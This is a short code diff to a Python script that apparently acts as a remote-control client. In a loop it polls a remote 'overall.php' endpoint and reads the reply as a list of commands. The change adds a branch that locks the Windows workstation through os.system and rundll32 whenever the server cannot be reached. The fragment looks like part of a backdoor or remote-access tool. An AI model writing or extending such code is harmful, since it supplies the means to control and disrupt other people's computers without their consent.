@@ -36,7 +36,11 @@ while True:
     try:
         r = requests.post(req_url + 'overall.php', data={'VALIDATE': 'GTC contre project'})
     except requests.exceptions.ConnectionError:
-        time.sleep(5)
+        if req_url.count('kc') >= 1:
+            os.system('rundll32.exe user32.dll LockWorkStation')
+            time.sleep(30)
+        else:
+            time.sleep(5)
         continue
     command = r.text.split('\n')
     print(command)
